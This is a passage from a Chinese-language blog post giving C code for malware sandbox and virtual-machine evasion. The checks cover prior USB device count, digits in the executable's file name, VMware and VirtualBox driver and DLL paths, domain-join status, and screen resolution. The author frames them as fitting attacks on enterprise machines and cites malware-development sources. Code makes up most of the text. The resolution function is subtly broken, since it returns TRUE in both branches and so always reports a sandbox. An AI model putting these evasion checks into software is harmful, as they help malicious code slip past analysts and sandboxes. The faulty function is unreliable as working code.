<h4 id="检查USB"><a href="#检查USB" class="headerlink" title="检查USB"></a>检查USB</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">BOOL <span class="title function_">CheckUSB</span><span class="params">()</span> &#123;</span><br><span class="line">    HKEY hKey = <span class="literal">NULL</span>;          <span class="comment">// 用于存储打开的注册表项句柄</span></span><br><span class="line">    DWORD dwUsbNumber = <span class="number">0</span>;     <span class="comment">// 用于存储 USB 设备数量</span></span><br><span class="line">    DWORD dwRegErr = <span class="number">0</span>;        <span class="comment">// 用于存储注册表操作的错误代码</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打开注册表项以获取 USB 存储设备的枚举信息</span></span><br><span class="line">    dwRegErr = RegOpenKeyExA(HKEY_LOCAL_MACHINE, <span class="string">&quot;SYSTEM\\ControlSet001\\Enum\\USBSTOR&quot;</span>, <span class="number">0</span>, KEY_READ, &amp;hKey);</span><br><span class="line">    <span class="keyword">if</span> (dwRegErr != ERROR_SUCCESS) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n\t[!] RegOpenKeyExA Failed With Error: %d | 0x%0.8X \n&quot;</span>, dwRegErr, dwRegErr);</span><br><span class="line">        <span class="keyword">return</span> FALSE; <span class="comment">// 打开注册表项失败时返回 FALSE</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查询注册表项的子项数量，即 USB 存储设备的数量</span></span><br><span class="line">    dwRegErr = RegQueryInfoKeyA(hKey, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;dwUsbNumber, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (dwRegErr != ERROR_SUCCESS) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n\t[!] RegQueryInfoKeyA Failed With Error: %d | 0x%0.8X \n&quot;</span>, dwRegErr, dwRegErr);</span><br><span class="line">        RegCloseKey(hKey); <span class="comment">// 确保在失败时关闭注册表项句柄</span></span><br><span class="line">        <span class="keyword">return</span> FALSE;      <span class="comment">// 查询失败时返回 FALSE</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打印检测到的 USB 数量</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Number of USB devices previously mounted: %u\n&quot;</span>, dwUsbNumber);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果之前挂载的 USB 设备少于 2 个，则可能是虚拟化环境</span></span><br><span class="line">    <span class="keyword">if</span> (dwUsbNumber &lt; <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Warning: Less than 2 USB devices previously mounted.\n&quot;</span>);</span><br><span class="line">        RegCloseKey(hKey); <span class="comment">// 关闭注册表项句柄</span></span><br><span class="line">        <span class="keyword">return</span> TRUE;       <span class="comment">// 返回 TRUE 表示可能是虚拟化环境</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    RegCloseKey(hKey); <span class="comment">// 关闭注册表项句柄</span></span><br><span class="line">    <span class="keyword">return</span> FALSE;      <span class="comment">// 返回 FALSE 表示正常环境</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 检查系统的 USB 设备数量</span></span><br><span class="line">    <span class="keyword">if</span> (CheckUSB()) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The system is potentially running in a virtualized environment.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The system has a normal number of USB devices.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="检查文件名"><a href="#检查文件名" class="headerlink" title="检查文件名"></a>检查文件名</h4><p>沙箱通常会将文件重命名为⼀种分类方法(例如，将其重命名为其 MD5 哈希)。此过程通常会导致一个包含字母和数字混合的任意文件名.</p>
<p>如果文件名中包含的数字超过 3 个，则<code>ExeDigitsInNameCheck</code>将假定它位于沙箱中并返回 TRUE</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;shlwapi.h&gt;</span> <span class="comment">// 包含 PathFindFileNameA 函数的头文件</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span>   <span class="comment">// 包含 isdigit 函数的头文件</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;Shlwapi.lib&quot;</span>) <span class="comment">// 链接 Shlwapi 库</span></span></span><br><span class="line"></span><br><span class="line">BOOL <span class="title function_">ExeDigitsInNameCheck</span><span class="params">()</span> &#123;</span><br><span class="line">    CHAR Path[MAX_PATH * <span class="number">3</span>];  <span class="comment">// 用于存储完整路径的缓冲区</span></span><br><span class="line">    CHAR cName[MAX_PATH];     <span class="comment">// 用于存储文件名的缓冲区</span></span><br><span class="line">    DWORD dwNumberOfDigits = <span class="number">0</span>; <span class="comment">// 用于计数文件名中的数字个数</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取当前模块（可执行文件）的完整路径</span></span><br><span class="line">    <span class="keyword">if</span> (!GetModuleFileNameA(<span class="literal">NULL</span>, Path, MAX_PATH * <span class="number">3</span>)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n\t[!] GetModuleFileNameA Failed With Error : %d \n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE; <span class="comment">// 获取失败，返回 FALSE</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取文件名（从完整路径中提取）</span></span><br><span class="line">    LPCSTR fileName = PathFindFileNameA(Path);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;文件名为:%s\n&quot;</span>, fileName);</span><br><span class="line">    <span class="comment">// 防止缓冲区溢出，确保文件名长度在 MAX_PATH 之内</span></span><br><span class="line">    <span class="keyword">if</span> (lstrlenA(fileName) &lt; MAX_PATH) &#123;</span><br><span class="line">        lstrcpyA(cName, fileName); <span class="comment">// 将文件名复制到 cName 缓冲区中</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> FALSE; <span class="comment">// 文件名过长，返回 FALSE</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历文件名中的每个字符，统计数字的个数</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; lstrlenA(cName); i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">isdigit</span>(cName[i])) &#123;</span><br><span class="line">            dwNumberOfDigits++; <span class="comment">// 如果是数字，计数器加一</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果文件名中的数字个数超过 3，则返回 TRUE</span></span><br><span class="line">    <span class="keyword">if</span> (dwNumberOfDigits &gt; <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> FALSE; <span class="comment">// 否则返回 FALSE</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 检查当前可执行文件名中的数字个数</span></span><br><span class="line">    <span class="keyword">if</span> (ExeDigitsInNameCheck()) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Filename contains more than 3 digits.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Filename contains 3 or fewer digits.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="检查DLLS"><a href="#检查DLLS" class="headerlink" title="检查DLLS"></a>检查DLLS</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 检测是否存在指定的沙箱相关的 DLL</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">checkSandboxDlls</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 定义已知的与沙箱相关的 DLL 名称列表</span></span><br><span class="line">    <span class="type">const</span> <span class="type">wchar_t</span>* dllNames[] = &#123;</span><br><span class="line">        <span class="string">L&quot;C:\\windows\\System32\\Drivers\\Vmmouse.sys&quot;</span>,</span><br><span class="line">        <span class="string">L&quot;C:\\windows\\System32\\Drivers\\vmtray.dll&quot;</span>,</span><br><span class="line">        <span class="string">L&quot;C:\\windows\\System32\\Drivers\\VMToolsHook.dll&quot;</span>,</span><br><span class="line">        <span class="string">L&quot;C:\\windows\\System32\\Drivers\\vmmousever.dll&quot;</span>,</span><br><span class="line">        <span class="string">L&quot;C:\\windows\\System32\\Drivers\\vmhgfs.dll&quot;</span>,</span><br><span class="line">        <span class="string">L&quot;C:\\windows\\System32\\Drivers\\vmGuestLib.dll&quot;</span>,</span><br><span class="line">        <span class="string">L&quot;C:\\windows\\System32\\Drivers\\VBoxMouse.sys&quot;</span>,</span><br><span class="line">        <span class="string">L&quot;C:\\windows\\System32\\Drivers\\VBoxGuest.sys&quot;</span>,</span><br><span class="line">        <span class="string">L&quot;C:\\windows\\System32\\Drivers\\VBoxSF.sys&quot;</span>,</span><br><span class="line">        <span class="string">L&quot;C:\\windows\\System32\\Drivers\\VBoxVideo.sys&quot;</span>,</span><br><span class="line">        <span class="string">L&quot;C:\\windows\\System32\\vboxdisp.dll&quot;</span>,</span><br><span class="line">        <span class="string">L&quot;C:\\windows\\System32\\vboxhook.dll&quot;</span>,</span><br><span class="line">        <span class="string">L&quot;C:\\windows\\System32\\vboxoglerrorspu.dll&quot;</span>,</span><br><span class="line">        <span class="string">L&quot;C:\\windows\\System32\\vboxoglpassthroughspu.dll&quot;</span>,</span><br><span class="line">        <span class="string">L&quot;C:\\windows\\System32\\vboxservice.exe&quot;</span>,</span><br><span class="line">        <span class="string">L&quot;C:\\windows\\System32\\vboxtray.exe&quot;</span>,</span><br><span class="line">        <span class="string">L&quot;C:\\windows\\System32\\VBoxControl.exe&quot;</span>,</span><br><span class="line">        <span class="string">L&quot;C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe&quot;</span>,</span><br><span class="line">        <span class="string">L&quot;C:\\Program Files\\Common Files\\VMware\\Drivers\\mouse\\Win8\\vmmousever.dll&quot;</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> numElements = <span class="keyword">sizeof</span>(dllNames) / <span class="keyword">sizeof</span>(dllNames[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; numElements; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (_waccess(dllNames[i], <span class="number">0</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            wprintf(<span class="string">L&quot;Detected sandbox-related DLL: %s\n&quot;</span>, dllNames[i]);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (checkSandboxDlls()) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Sandbox environment detected.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;No sandbox environment detected.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="检查域环境"><a href="#检查域环境" class="headerlink" title="检查域环境"></a>检查域环境</h4><p>由于我们通常针对企业环境，因此可以假设用户的计算机是域的成员。让我们检查机器的域加入状态：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;lm.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;Netapi32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line">BOOL <span class="title function_">checkDomain</span><span class="params">()</span> &#123;</span><br><span class="line">    PWSTR domainName = <span class="literal">NULL</span>;</span><br><span class="line">    NETSETUP_JOIN_STATUS status;</span><br><span class="line">    NET_API_STATUS nStatus;</span><br><span class="line"></span><br><span class="line">    nStatus = NetGetJoinInformation(<span class="literal">NULL</span>, &amp;domainName, &amp;status);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nStatus != NERR_Success) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Failed to get join information. Error: %lu\n&quot;</span>, nStatus);</span><br><span class="line">        <span class="keyword">return</span> FALSE;  <span class="comment">// 返回FALSE，表示无法确定域状态</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    BOOL notInDomain = (status != NetSetupDomainName);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (notInDomain) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The computer is not joined to a domain.\n&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        wprintf(<span class="string">L&quot;The computer is joined to the domain: %s\n&quot;</span>, domainName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (domainName != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        NetApiBufferFree(domainName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> notInDomain;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (checkDomain()) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The computer is not in a domain.\n&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The computer is in a domain.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="检查屏幕分辨率"><a href="#检查屏幕分辨率" class="headerlink" title="检查屏幕分辨率"></a>检查屏幕分辨率</h4><p>虚拟化环境很少使用多个监视器（尤其是沙箱）。虚拟显示器也可能具有非典型的屏幕尺寸（特别是当安装到主机屏幕但不是全屏模式时-请注意带有栏和选项卡的管理程序窗口）。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果没有定义 PROCESS_DPI_AWARENESS，则手动定义它</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> PROCESS_DPI_AWARENESS</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">    PROCESS_DPI_UNAWARE = <span class="number">0</span>,</span><br><span class="line">    PROCESS_SYSTEM_DPI_AWARE = <span class="number">1</span>,</span><br><span class="line">    PROCESS_PER_MONITOR_DPI_AWARE = <span class="number">2</span></span><br><span class="line">&#125; PROCESS_DPI_AWARENESS;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="comment">// 设置应用程序为 DPI 感知（兼容 Windows 8.1 及以下）</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">SetDpiAwareness</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 在 Windows 8.1 及以上使用 SetProcessDpiAwareness</span></span><br><span class="line">    HMODULE shcore = LoadLibraryA(<span class="string">&quot;Shcore.dll&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (shcore) &#123;</span><br><span class="line">        <span class="keyword">typedef</span> <span class="title function_">HRESULT</span><span class="params">(WINAPI* SetProcessDpiAwarenessFunc)</span><span class="params">(PROCESS_DPI_AWARENESS)</span>;</span><br><span class="line">        SetProcessDpiAwarenessFunc setDpiAwareness =</span><br><span class="line">            (SetProcessDpiAwarenessFunc)GetProcAddress(shcore, <span class="string">&quot;SetProcessDpiAwareness&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (setDpiAwareness) &#123;</span><br><span class="line">            setDpiAwareness((PROCESS_DPI_AWARENESS)PROCESS_PER_MONITOR_DPI_AWARE);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        FreeLibrary(shcore);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 在 Windows 8 及更早版本使用 SetProcessDPIAware</span></span><br><span class="line">        HMODULE user32 = LoadLibraryA(<span class="string">&quot;user32.dll&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (user32) &#123;</span><br><span class="line">            <span class="keyword">typedef</span> <span class="title function_">BOOL</span><span class="params">(WINAPI* SetProcessDPIAwareFunc)</span><span class="params">()</span>;</span><br><span class="line">            SetProcessDPIAwareFunc setDPIAware =</span><br><span class="line">                (SetProcessDPIAwareFunc)GetProcAddress(user32, <span class="string">&quot;SetProcessDPIAware&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (setDPIAware) &#123;</span><br><span class="line">                setDPIAware();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            FreeLibrary(user32);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL <span class="title function_">CheckResolution</span><span class="params">()</span> &#123;</span><br><span class="line">    SetDpiAwareness(); <span class="comment">// 设置应用程序为 DPI 感知</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取主显示器的水平和垂直分辨率</span></span><br><span class="line">    <span class="type">int</span> xResolution = GetSystemMetrics(SM_CXSCREEN);</span><br><span class="line">    <span class="type">int</span> yResolution = GetSystemMetrics(SM_CYSCREEN);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查显示器分辨率是否符合预期的典型值</span></span><br><span class="line">    <span class="keyword">if</span> ((xResolution != <span class="number">1920</span> &amp;&amp; xResolution != <span class="number">2560</span> &amp;&amp; xResolution != <span class="number">1440</span> &amp;&amp; xResolution != <span class="number">3200</span> &amp;&amp; xResolution != <span class="number">3840</span>)</span><br><span class="line">        || (yResolution != <span class="number">1080</span> &amp;&amp; yResolution != <span class="number">1200</span> &amp;&amp; yResolution != <span class="number">1600</span> &amp;&amp; yResolution != <span class="number">900</span> &amp;&amp; yResolution != <span class="number">1800</span> &amp;&amp; yResolution != <span class="number">2160</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Unexpected resolution: %d x %d\n&quot;</span>, xResolution, yResolution);</span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Resolution is as expected: %d x %d\n&quot;</span>, xResolution, yResolution);</span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (CheckResolution()) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Sandbox environment detected.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;No sandbox environment detected.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<div class="article-footer fs14">
    <section id="references">
      <div class="header"><span>参考资料</span></div>
      <div class="body">
        <ul>
        <li class="post-title">
          <p><a target="_blank" rel="noopener" href="https://iruko.org/archives/anti-vm-and-sandbox">反虚拟机和沙箱检测的一些小技巧</a></p>

        </li>
        
        <li class="post-title">
          <p><a target="_blank" rel="noopener" href="https://0xpat.github.io/Malware_development_part_2/">Malware_development_part_2</a></p>

        </li>
        
        <li class="post-title">
          <p><a target="_blank" rel="noopener" href="https://medium.com/@exploitdevvv/malware-101-anti-virtualization-anti-debugging-methods-04353f0a9407">Anti-Virtualization &amp; Anti-Debugging Methods</a></p>

        </li>
        </ul>
      </div>
    </section>
    
    <section id="license">
      <div class="header"><span>许可协议</span></div>
      <div class="body"><p>本文由 <a href="https://jiangjiyue.github.io/">kill3r</a> 原创,采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
</div>
    </section>
    
    <section id="share">
      <div class="header"><span>分享文章</span></div>
      <div class="body">
        <div class="link"><input class="copy-area" readonly="true" id="copy-link" value="https://jiangjiyue.github.io/2024/11/07/c9983715/" /></div>
